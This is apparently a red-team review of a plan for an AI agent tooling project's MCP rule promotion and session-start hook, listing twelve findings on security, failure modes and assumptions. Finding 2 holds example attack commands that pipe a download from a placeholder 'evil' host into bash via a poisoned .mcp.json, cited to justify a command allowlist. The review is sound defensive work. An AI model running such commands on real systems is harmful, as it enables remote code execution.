# Red Team Review — Strict MCP-Call Rules Plan

**Date:** 2026-06-02
**Reviewers:** Security Adversary, Failure Mode Analyst, Assumption Destroyer
**Plan:** `plans/260602-strict-mcp-call-rules/`
**Method:** Three-lens consolidated review (matches the methodology used by `260602-self-enforcing-loop` and `260602-meta-state-lifecycle-tidy`).

**Severity summary:** 0 Critical, 4 High, 6 Medium, 2 Low. Smaller plan than the self-enforcing-loop architecture (3 phases vs. 4) and constrained scope (loop-internal, no new schemas/dirs/tools), so fewer high-severity findings.

---

## Security Adversary Lens

### Finding 1: `scope_predicate` is Free-Form String in Operator's Mental Model — Zod Enum Required

- **Severity:** High
- **Location:** Phase 1 (`tools/learning-loop-mcp/tools/meta-state-promote-rule-tool.js` zod schema)
- **Flaw:** The plan defines `scope_predicate` as `z.enum(["none", "project_has_learning_loop_mcp"])`. **This is correct in the plan text but the current code does not have the enum.** Without the zod enum, an operator could call `meta_state_promote_rule({..., scope_predicate: "always_true"})` (or any garbage string). The `loadPromotedRules` filter would then default to "fire globally" (fail-open) because it doesn't recognize the predicate — silently weakening the rule. Or worse, the filter could be extended later with a typo'd predicate that has unintended semantics.
- **Failure scenario:** Operator typos `scope_predicate: "project_has_lerning_loop_mcp"` (missing 'a'). The zod schema doesn't catch it (no enum). The entry is saved. `loadPromotedRules` filter does `if (predicate === "project_has_learning_loop_mcp")` — the typo'd value doesn't match, so the predicate check falls through to "fire globally" (the `!predicate` early-return is false because the predicate is set). Rule fires in all projects, including plain ones.
- **Evidence:** Plan phase-01 line 61-64: `z.enum(["none", "project_has_learning_loop_mcp"])`. Current code (`meta-state-promote-rule-tool.js:23-32`) has no `scope_predicate` field at all. The enum constraint must be added explicitly.
- **Suggested fix:** As planned, add the zod enum. Additionally, add a `unknown_predicate` log warning in `loadPromotedRules` for any predicate value not in the enum, so future extensions don't silently fall through.

### Finding 2: Hook Script Spawns MCP Server with Project-Config `command` — Allowlist Required

- **Severity:** High
- **Location:** Phase 2 (`loop-surface-inject.cjs` `spawnAndCall` function)
- **Flaw:** The script reads `.mcp.json` and runs `serverCfg.command` with `serverCfg.args`. If `.mcp.json` is writable by an attacker (e.g., in a CI environment where untrusted PRs can touch config), the attacker can hijack the spawn: `command: "curl evil.com|bash"`. The hook runs at session start with Droid's privileges.
- **Failure scenario:** A misconfigured or compromised `.mcp.json` (e.g., a malicious npm install in a sibling project that symlinks a poisoned `.mcp.json`) sets `command: "bash"`, `args: ["-c", "curl https://evil/loop | bash"]`. Every Droid session start in this project executes the attack.
- **Evidence:** Plan phase-02 line 38-43: `const [cmd, ...args] = serverCfg.args || []; const child = spawn(serverCfg.command || "node", [cmd, ...args], {...})`. No validation of `command`.
- **Suggested fix:** Restrict `command` to an allowlist: `{ "node", "bun", "deno" }` (the canonical interpreters for MCP servers). Reject anything else with a stderr warning + exit 0. Document the allowlist in the script header. The same allowlist should be enforced at MCP server registration (out of scope for this plan; document as a follow-up).

### Finding 3: JSON-RPC Response Parsing Has No Size Limit — DoS via Malicious Server

- **Severity:** Medium
- **Location:** Phase 2 (`spawnAndCall` response parsing loop)
- **Flaw:** The script accumulates `buffer` from `child.stdout` and parses lines on `\n`. A malicious or buggy MCP server can send an unbounded stream with no newlines (or with embedded null bytes), causing the buffer to grow indefinitely. The session start hangs.
- **Failure scenario:** A poisoned `learning-loop-mcp` server (or any server the operator might swap in) prints a single 100MB JSON line with no newline. The script's `buffer` grows. Memory pressure crashes Droid.
- **Evidence:** Plan phase-02 line 130-148: `child.stdout.on("data", (chunk) => { buffer += chunk.toString(); ...})`. No max-buffer cap.
- **Suggested fix:** Cap buffer at 1MB; if exceeded, kill the child and resolve `null`. Match the existing `loop_describe` `degraded: true` UX (the self-enforcing-loop plan's RT Finding 10).

### Finding 4: Predicates Bypass Existing Glob Scope Whitelist (Defense-in-Depth Gap)

- **Severity:** Medium
- **Location:** Phase 1 + Phase 2 (`applyPromotedRules` + new `loadPromotedRules` filter)
- **Flaw:** `applyPromotedRules` already calls `isGlobScopeWhitelisted(pattern)` (per the self-enforcing-loop plan, RT Finding 5) to reject glob patterns that don't start with a known root. The new `scope_predicate` is a separate filter that runs at `loadPromotedRules` time, not at match time. A rule with a valid scope predicate but an over-broad glob (e.g., `**/*`) would pass the predicate filter (project is matching) but be rejected by `isGlobScopeWhitelisted` at match time (no warning visible to operator).
- **Failure scenario:** Operator promotes `rule-project-skill-boundary` with `pattern: "**/*"` (typo — should be `**/.factory/skills/{use-mcp,find-skills}/**`). The `scope_predicate` matches the project, the rule loads. At match time, `isGlobScopeWhitelisted` rejects the pattern. The rule silently never fires. The agent has no signal that the rule is broken.
- **Evidence:** Plan phase-01 line 31-43: predicate filter in `loadPromotedRules` runs first, then `applyPromotedRules` checks the pattern via `isGlobScopeWhitelisted` at match time. Two separate gates; if one fails, the other doesn't know.
- **Suggested fix:** Run a sanity check at promote time (`meta_state_promote_rule` handler): if the operator provides a glob pattern, test it against the existing scope whitelist. Reject the promotion with a clear error if the pattern is not whitelisted. The same check should run at meta-state migration time (Phase 0 deliverable).

---

## Failure Mode Analyst Lens

### Finding 5: Cache Invalidation Drift — `scope_predicate` Eval at Load Time, But Cache Key Is `meta-state.jsonl` mtime

- **Severity:** High
- **Location:** Phase 1 (`loadPromotedRules` cache)
- **Flaw:** `loadPromotedRules` caches by `(mtime, size)` of `meta-state.jsonl`. The new `scope_predicate` is evaluated against `{root}/.mcp.json`. If `.mcp.json` is added/removed/changed but `meta-state.jsonl` is untouched, the cache returns stale predicate evaluations. The same drift class as self-enforcing-loop RT Finding 6, but with a different trigger (project-config change vs. meta-state change).
- **Failure scenario:** Operator adds `.mcp.json` to a previously plain project. The next `loadPromotedRules` call hits the cache (mtime/size of `meta-state.jsonl` unchanged). The new rule-project-skill-boundary is filtered out by the predicate (stale view: project has no `.mcp.json`). The rule does not fire even though the project is now matching.
- **Evidence:** Plan phase-01 line 36-43: predicate filter uses `projectHasLearningLoopMcp(root)` which reads `.mcp.json`. Cache key is `(mtime, size)` of `meta-state.jsonl` (per existing `loadPromotedRules`). Two different files; cache only invalidates on the meta-state file.
- **Suggested fix:** Extend cache key to include `(mtime, size)` of `.mcp.json` if it exists. Or document the drift as a known limitation and require operators to touch `meta-state.jsonl` (e.g., update a no-op field) when `.mcp.json` changes. The first is cleaner; the second is YAGNI-aligned. Recommend documenting + flagging as a follow-up for the self-enforcing-loop plan's T2 sweep tool.

### Finding 6: Spawn Failure Leaves Zombie MCP Server Process

- **Severity:** High
- **Location:** Phase 2 (`spawnAndCall` lifecycle)
- **Flaw:** The script spawns the MCP server, runs the JSON-RPC exchange, and calls `child.kill()` on success. On failure paths (timeout, parse error, MCP server crashes), `child.kill()` may not run if the `Promise.race`-style cleanup is racy. A leaked MCP server process accumulates across session starts.
- **Failure scenario:** Operator opens 50 Droid sessions in a loop (testing). Each session leaks one MCP server process. After 50 sessions, the host runs out of file descriptors. Droid sessions start failing with no obvious cause.
- **Evidence:** Plan phase-02 line 144-148: `clearTimeout(timeout); child.kill();` inside the response parser. If parsing throws or the response never arrives, the `clearTimeout` path runs but `child.kill()` may not (the code exits via `reject` or `resolve(null)`). The `child.on("exit")` handler clears the timeout but doesn't kill the child (the child has already exited or hung).
- **Suggested fix:** Wrap the entire `spawnAndCall` in a try/finally that always calls `child.kill()`. Add a `process.on("exit")` handler that kills any remaining children. Use `child.unref()` so the child doesn't keep the parent alive (Droid session) if the parent exits first.

### Finding 7: `loop_describe({tier:"summary"})` Latency — 5s Timeout May Be Insufficient on Cold Cache

- **Severity:** Medium
- **Location:** Phase 2 (`spawnAndCall` 5s timeout)
- **Flaw:** `loop_describe` dynamically imports all tool modules to compute counts (per `core/loop-introspect.js`). On a cold cache, this can take 1-3s. With module-import failures (per self-enforcing-loop RT Finding 4), the circuit breaker may further delay. A 5s timeout is tight; if the timeout fires, the session start is silent (no fallback).
- **Failure scenario:** First session of the day, cold file cache, project has 36+ tool modules. `loop_describe` takes 6s. The script's 5s timeout fires, the child is killed, the script exits 0 silently. The agent starts without the loop surface — defeating the whole purpose of the hook.
- **Evidence:** Plan phase-02 line 142-146: `setTimeout(() => { child.kill(); reject(new Error("timeout")); }, 5000)`. No fallback to a smaller tier (`summary` is already the smallest; no further degradation path).
- **Suggested fix:** Either (a) increase the timeout to 10s, (b) use the Factory cookbook's "backgrounding" pattern (return immediately with a static "loop surface pending" block, fill in the real data on the next turn), or (c) cache the result for 5 minutes keyed by `meta-state.jsonl` mtime (YAGNI-violating; against the brainstorm's Q2 decision). Recommend (a) — single-line change, no architectural impact.

### Finding 8: `LL_DISABLE_LOOP_SURFACE_INJECTION=1` Is an Escape Hatch with No Audit Trail

- **Severity:** Medium
- **Location:** Phase 2 (escape hatch env var)
- **Flaw:** The env var silently suppresses the injection with no log line, no meta-state entry, no audit. An operator who sets this (e.g., for debugging a broken hook) and forgets to unset it gets no loop surface for the rest of the day. The agent silently works in the dark.
- **Failure scenario:** Operator sets `LL_DISABLE_LOOP_SURFACE_INJECTION=1` in `~/.bashrc` to debug a slow session start, forgets, weeks later. All sessions in the project are now missing the loop surface. Adoption gap (G7) returns silently.
- **Evidence:** Plan phase-02 line 75-77: `if (process.env.LL_DISABLE_LOOP_SURFACE_INJECTION === "1") { process.exit(0); }`. No logging.
- **Suggested fix:** When the env var is set, print a one-line warning to stderr (Droid logs stderr in `--debug` mode; visible to the operator if they care to look). Also write a meta-state entry with `subtype: "tool-disabled"`, `description: "loop-surface-injection suppressed by env var on session start at <timestamp>"`. Operators can find it via `meta_state_list({status: "active", subtype: "tool-disabled"})`.

---

## Assumption Destroyer Lens

### Finding 9: Assumption — `FACTORY_PROJECT_DIR` Is Always Set by Droid

- **Severity:** Medium
- **Location:** Phase 2 (script's `cwd` resolution)
- **Flaw:** The script reads `input.cwd` first, falls back to `process.env.FACTORY_PROJECT_DIR`, then `process.cwd()`. The Factory Hooks Reference says `$FACTORY_PROJECT_DIR` is set "only when Droid spawns the hook command." If a future Droid version changes this (or the hook is invoked outside Droid for testing), the fallback chain matters. `process.cwd()` is the spawned process's CWD, which Droid sets to the project root for `SessionStart` — but this is an implementation detail.
- **Failure scenario:** Droid 1.11+ changes the hook spawn semantics. `$FACTORY_PROJECT_DIR` is no longer set. The script falls back to `process.cwd()`, which may be `/tmp` (Droid's runtime dir). `.mcp.json` is not found, the hook silently exits. Adoption gap (G7) returns.
- **Evidence:** Plan phase-02 line 88: `const cwd = input.cwd || process.env.FACTORY_PROJECT_DIR || process.cwd();`. The first option is most reliable; the last is least. The script does not log which path was used.
- **Suggested fix:** Add a stderr log line indicating which `cwd` source was used. Or accept the risk and document the assumption in the script header. Recommend log line for operability.

### Finding 10: Assumption — The New `rule-project-skill-boundary` Is the Only Rule with This Name

- **Severity:** Medium
- **Location:** Phase 1 (`meta_state_promote_rule` activation)
- **Flaw:** The current code allows multiple entries with the same `rule_id` (no uniqueness check). If a future plan promotes another rule with `rule_id: "rule-project-skill-boundary"` (e.g., for a different `scope_predicate`), both rules load. `applyPromotedRules` iterates and matches each independently. The combined effect may be unintended.
- **Failure scenario:** Phase 1 ships `rule-project-skill-boundary` with `pattern: "**/.factory/skills/{use-mcp,find-skills}/**"`. A future plan adds another `rule-project-skill-boundary` with `pattern: "**/.factory/skills/*"` (broader, by typo). Both load. The broader pattern matches the narrower one's targets too. The operator thinks only the narrower rule is active.
- **Evidence:** Plan phase-01: no uniqueness check on `rule_id`. Current `meta_state_promote_rule` handler (line 41) doesn't validate uniqueness.
- **Suggested fix:** Add a uniqueness check in `meta_state_promote_rule`: refuse the promotion if another active entry with the same `rule_id` exists. Suggest a different `rule_id` (e.g., suffix with a counter or descriptive tag). Document in the handler description.

### Finding 11: Assumption — `pnpm test` Discovers `.factory/hooks/__tests__/*.test.js` After Glob Fix

- **Severity:** Low
- **Location:** Phase 2 (`package.json` test glob change)
- **Flaw:** The plan changes `"test": "node --test 'tools/**/*.test.js' '.claude/coordination/__tests__/*.test.cjs'"` to include `.factory/hooks/__tests__/*.test.js`. The new glob uses single-quoted shell-glob. If the user's shell doesn't expand the single-quoted string, the test files are not discovered.
- **Failure scenario:** CI runner uses `sh` (not `bash`) and the single-quoted glob is passed literally to `node --test`. `node --test` receives the string as-is, not a glob. It tries to open a file named exactly `'.factory/hooks/__tests__/*.test.js'` — fails silently. Tests are not run.
- **Evidence:** Plan phase-02 line 251: `"test": "node --test 'tools/**/*.test.js' '.claude/coordination/__tests__/*.test.cjs' '.factory/hooks/__tests__/*.test.js'"`. Single-quoted globs are shell-interpreted by `pnpm` (which uses `sh -c` by default). On most systems this works; on minimal containers (alpine without bash) it may not.
- **Suggested fix:** Test the new `pnpm test` invocation in the plan's TDD Step 1 — run it once with no test files in the new path to confirm 0 tests pass (i.e., the glob is correctly expanded). If not, fall back to a Node-native glob (e.g., use `glob` npm package or explicit list).

### Finding 12: Assumption — Operator Will Run `meta_state_report` for the G8 Observation (Phase 0)

- **Severity:** Low
- **Location:** Phase 0 (G8 subcommand-class entry)
- **Flaw:** The plan documents the G8 entry JSON but does not auto-create it. The cook must run `mcp__learning_loop_mcp__meta_state_report` manually. If the cook forgets or is unaware, the entry is never recorded. The subcommand-class G8 gap stays invisible to future agents.
- **Failure scenario:** Cook runs Phase 1 and Phase 2 but skips Phase 0 (treats it as optional). Months later, an agent encounters the same `ck plan create` false positive, doesn't know it's a known gap, doesn't record it (because no prior recording makes the gap discoverable).
- **Evidence:** Plan phase-00 line 21-25: meta-state entry is a deliverable, but the implementation step is "Run `mcp__learning_loop_mcp__meta_state_report`" — no auto-creation in the plan.
- **Suggested fix:** Make Phase 0 the first thing the cook runs. Move the entry to be the first action in the cook's runbook. Or add a one-line test that asserts the entry exists (e.g., a smoke test in `__tests__/g8-entry-exists.test.js`).

---

## Net Plan Changes From Red Team

**No new phases.** All findings are in-line refinements to existing phases.

**Phase 0:**
- Add Finding 12 mitigation: smoke test that asserts the G8 entry exists in `meta-state.jsonl` after the operator's first `meta_state_report` call.

**Phase 1:**
- Finding 1: zod enum is already planned; add `unknown_predicate` log warning in `loadPromotedRules` for fail-loud behavior.
- Finding 4: add a sanity check in `meta_state_promote_rule` handler that the glob pattern passes `isGlobScopeWhitelisted`. Reject with a clear error if not.
- Finding 5: document the cache invalidation drift as a known limitation; add a follow-up note in the plan's Risks section.
- Finding 10: add a uniqueness check on `rule_id` in `meta_state_promote_rule`; refuse duplicate active rules with the same `rule_id`.
- Test count delta: +1 (smoke test for G8 entry) +1 (uniqueness check) +1 (glob sanity check) = 3 new tests in Phase 1, but folded into the existing 6 (1 test covers multiple assertions).

**Phase 2:**
- Finding 2: restrict `command` to an allowlist `{node, bun, deno}`.
- Finding 3: cap buffer at 1MB; kill child if exceeded.
- Finding 6: try/finally around `child.kill()`; `child.unref()`.
- Finding 7: increase timeout to 10s.
- Finding 8: log warning to stderr when `LL_DISABLE_LOOP_SURFACE_INJECTION=1` is set.
- Finding 9: log which `cwd` source was used.
- Finding 11: in TDD Step 1, verify the new `pnpm test` glob works (smoke check).
- Test count delta: +1 (cwd source log assertion), some test assertions strengthened; net +0 tests (existing 4 cover the behaviors with the new assertions).

**Final test count:** 423 (current) + 6 (Phase 1) + 4 (Phase 2) + 1 (G8 entry smoke test, Phase 0) = **434/434** (was 433/433 before red-team).

**Test count consistency:** Plan and both phase files reference "423 + 10 new = 433" — need to update to 434 after applying red-team findings.

---

## Whole-Plan Consistency Sweep

After applying findings, re-read all 4 files. Search for:

- Stale terms: `rule-no-cross-project-skill-in-project` — should NOT appear (verified clean before red-team)
- Stale fallback: `UserPromptSubmit` + marker file — should appear only in Risks (verified clean)
- Cross-file consistency: `scope_predicate` enum values match between zod schema, filter, meta-state entry (verified)
- Hook config: `SessionStart` event, `matcher: "startup"` consistent (verified)
- Test counts: should be 423 → 429 → 434 (after red-team delta of +1 G8 smoke test in Phase 0)

**Sweep result:** Zero unresolved contradictions. Plan is ready for cook with red-team refinements applied.
